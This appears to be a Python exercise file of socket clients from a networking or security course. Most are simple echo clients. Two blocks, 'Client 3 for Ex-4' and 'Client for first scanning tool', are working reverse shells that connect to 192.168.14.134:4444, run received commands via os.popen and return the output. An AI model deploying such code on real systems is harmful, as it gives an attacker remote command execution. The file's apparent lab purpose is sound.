# Client 1 for Ex-1 & Ex-2

"""
from socket import *

# Change the port number for specific exercise !!!!


client = socket(AF_INET, SOCK_STREAM)
client.connect(("192.168.14.134", 4444))

while True:
    data = input("[+] Data >")
    client.sendall(data.encode())

    if data == "exit":
        client.close()
        break

    data = client.recv(2048).decode()
    print("Servers response:", data)
"""

# Client 2 for Ex-3

"""
from socket import *
import threading

# Change the port number for specific exercise !!!!

def reader(client):
    data = client.recv(2048).decode()
    print("Response> {0}".format(data))

client = socket(AF_INET, SOCK_STREAM)
client.connect(("192.168.14.134", 4444))

t = threading.Thread(target=reader,args=(client,))
t.start()

while True:
    data = input("[+] Data >")
    client.sendall(data.encode())

    if data == "exit":
        client.close()
        break
"""

# Client 3 for Ex-4

"""
from socket import *
import os

# Change the port number for specific exercise !!!!

client = socket(AF_INET, SOCK_STREAM)
client.connect(("192.168.14.134", 4444))

while True:
    data = client.recv(2048).decode()

    if data == "exit":
        client.close()
        break

    result = os.popen(data).read()
    client.sendall(result.encode())
"""

# Client for first scanning tool

"""
from socket import *
import os

# Change the port number for specific exercise !!!!

client = socket(AF_INET, SOCK_STREAM)
client.connect(("192.168.14.134", 4444))

while True:
    data = client.recv(2048).decode()

    if data == "exit":
        client.close()
        break

    result = os.popen(data).read()
    client.sendall(result.encode())
"""

# Client for UDP server


from socket import *

client = socket(AF_INET, SOCK_DGRAM)

while True:
    data = input("Client: ")

    client.sendto(data.encode(), ("127.0.0.1", 3333))
    data, server = client.recvfrom(2048)
    print(data.decode())
